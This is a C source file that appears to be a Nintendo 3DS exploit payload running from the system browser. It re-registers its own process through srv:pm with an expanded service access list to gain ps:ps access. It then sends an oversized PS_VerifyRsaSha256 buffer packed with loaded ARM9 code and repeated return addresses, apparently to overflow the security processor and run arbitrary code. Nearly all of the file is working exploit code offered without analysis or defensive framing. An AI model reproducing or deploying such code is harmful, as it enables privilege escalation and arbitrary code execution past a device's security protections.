#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include "types.h"

#define SPIDER_DATARO_START 0x00359000
#define SPIDER_DATABSS_START 0x003C7000
#define TEMP_ADR SPIDER_DATABSS_START

// Temp defines
const unsigned int arm9_main = SPIDER_DATARO_START;
const unsigned int arm9_main_end = SPIDER_DATARO_START + 0x4000;

typedef struct {
	s32 s;
	u32 pos;
	u32 size;
	u32 unk[5];
} IFILE;

int (*IFile_Open)(IFILE *f, const short *path, int flags) = (void*) 0x0025BC00;
int (*IFile_Read)(IFILE *f, unsigned int *read, void *buffer, unsigned int size) = (void*) 0x002FA864;

void svc_sleepThread(s64 ns);
s32 svc_connectToPort(Handle* out, const char* portName);
s32 svc_sendSyncRequest(Handle session);
s32 svc_getProcessId(u32 *out, Handle handle);

const u8 __attribute__ ((section (".rodata"))) access_bin[] =
{
	0x41, 0x50, 0x54, 0x3A, 0x55, 0x00, 0x00, 0x00, 0x79, 0x32, 0x72, 0x3A, 0x75, 0x00, 0x00, 0x00, 
	0x67, 0x73, 0x70, 0x3A, 0x3A, 0x47, 0x70, 0x75, 0x6E, 0x64, 0x6D, 0x3A, 0x75, 0x00, 0x00, 0x00, 
	0x66, 0x73, 0x3A, 0x55, 0x53, 0x45, 0x52, 0x00, 0x68, 0x69, 0x64, 0x3A, 0x55, 0x53, 0x45, 0x52, 
	0x64, 0x73, 0x70, 0x3A, 0x3A, 0x44, 0x53, 0x50, 0x63, 0x66, 0x67, 0x3A, 0x75, 0x00, 0x00, 0x00, 
	0x66, 0x73, 0x3A, 0x52, 0x45, 0x47, 0x00, 0x00, 0x70, 0x73, 0x3A, 0x70, 0x73, 0x00, 0x00, 0x00, 
	0x6E, 0x73, 0x3A, 0x73, 0x00, 0x00, 0x00, 0x00, 0x61, 0x6D, 0x3A, 0x6E, 0x65, 0x74, 0x00, 0x00, 
};

int _strlen(char* str)
{
	int l=0;
	while(*(str++))l++;
	return l;
}

void _strcpy(char* dst, char* src)
{
	while(*src)*(dst++)=*(src++);
	*dst=0x00;
}

void _memset(void* addr, int val, unsigned int size)
{
	char* caddr = (char*) addr;
	while(size--)
		*(caddr++) = val;
}

static inline void* getThreadLocalStorage(void)
{
	void* ret;
	asm
	(
		"mrc p15, 0, %[data], c13, c0, 3"
		:[data] "=r" (ret)
	);
	return ret;
}

static inline u32* getThreadCommandBuffer(void)
{
	return (u32*)((u8*)getThreadLocalStorage() + 0x80);
}

Result srvRegisterProcess(Handle *handle, u32 procid, u32 count, void *serviceaccesscontrol)
{
	Result rc = 0;
	
	u32 *cmdbuf = getThreadCommandBuffer();

	cmdbuf[0] = 0x04030082; // <7.x
	cmdbuf[1] = procid;
	cmdbuf[2] = count;
	cmdbuf[3] = (count << 16) | 2;
	cmdbuf[4] = (u32)serviceaccesscontrol;
	
	if((rc = svc_sendSyncRequest(*handle))) return rc;
		
	return cmdbuf[1];
}

Result srvUnregisterProcess(Handle *handle, u32 procid)
{
	Result rc = 0;
	
	u32 *cmdbuf = getThreadCommandBuffer();

	cmdbuf[0] = 0x04040040; // <7.x
	cmdbuf[1] = procid;
	
	if((rc = svc_sendSyncRequest(*handle))) return rc;
		
	return cmdbuf[1];
}

Result PS_VerifyRsaSha256(Handle *handle)
{
	Result ret = 0;
	u32 *cmdbuf = getThreadCommandBuffer();
	u8 *cmdbuf8 = (u8*)cmdbuf;
	
	//FW1F = 0x7440
	//FW0B = 0xD9B8
	const u32 bufSize = 0xD9B8;
	//const u32 bufSize = 0x7440;
	
	for(int i=0; i<bufSize; i++)
	{
		*(u8*)(TEMP_ADR+i) = 0;
	}
	
	*(u32*)(TEMP_ADR+0x28) = 0x820002;
	*(u32*)(TEMP_ADR+0x2C) = TEMP_ADR+0x80;
	*(u32*)(TEMP_ADR+0x30) = (bufSize<<4) | 0xA;
	*(u32*)(TEMP_ADR+0x34) = TEMP_ADR+0x380;
	*(u32*)(TEMP_ADR+0x280) = bufSize<<3; //RSA bit-size, for the signature.

	u32 *ptr = (u32*)(TEMP_ADR+0x380);
	u32 *src = (u32*)arm9_main;
	u32 size = arm9_main_end-arm9_main;
	const u32 nopsled = 0;//0x100;
	
	for(int i=0; i<nopsled; i+=4)
	{
		*ptr++ = 0xE1A00000;
	}
	
	for(int i=0; i<size; i+=4)
	{
		*ptr++ = *src++;
	}
	
	for(int i=0; i<bufSize-size-nopsled; i+=4)
	{
		*ptr++ = 0x080C2340; //2.1
	}
	
	for(int i=0; i<0x80; i++)
	{
		cmdbuf8[i] = *(u8*)(TEMP_ADR+i);
	}

	cmdbuf[0] = 0x00020244;
	
	if((ret = svc_sendSyncRequest(*handle))!=0)return ret;
	
	return (Result)cmdbuf[1];
}

Result srv_RegisterClient(Handle* handleptr)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0x10002; //request header code
	cmdbuf[1]=0x20;

	Result ret=0;
	if((ret=svc_sendSyncRequest(*handleptr)))return ret;

	return cmdbuf[1];
}

Result srv_getServiceHandle(Handle* handleptr, Handle* out, char* server)
{
	u8 l=_strlen(server);
	if(!out || !server || l>8)return -1;

	u32* cmdbuf=getThreadCommandBuffer();

	cmdbuf[0]=0x50100; //request header code
	_strcpy((char*)&cmdbuf[1], server);
	cmdbuf[3]=l;
	cmdbuf[4]=0x0;

	Result ret=0;
	if((ret=svc_sendSyncRequest(*handleptr)))return ret;

	*out=cmdbuf[3];

	return cmdbuf[1];
}

int _main()
{
	svc_sleepThread(0x10000000);
	
	IFILE file;
	unsigned int readBytes;
	_memset(&file, 0, sizeof(file));
	IFile_Open(&file, L"dmc:/arm9.bin", 1);
	IFile_Read(&file, &readBytes, (void*)arm9_main, 0x4000);
	
	Handle port;
	svc_connectToPort(&port, "srv:pm");
	
	srv_RegisterClient(&port);
	
	u32 proc = 0;
	svc_getProcessId(&proc, 0xFFFF8001);
	
	srvUnregisterProcess(&port, proc);
	
	srvRegisterProcess(&port, proc, 0x18, (void*)&access_bin[0]);
	
	Handle ps_handle;
	srv_getServiceHandle(&port, &ps_handle, "ps:ps");
	
	svc_sleepThread(0x10000000);
	
	u32 res = PS_VerifyRsaSha256(&ps_handle);
	
	svc_sleepThread(0x10000000);
	
	while(1);
	return 0;
}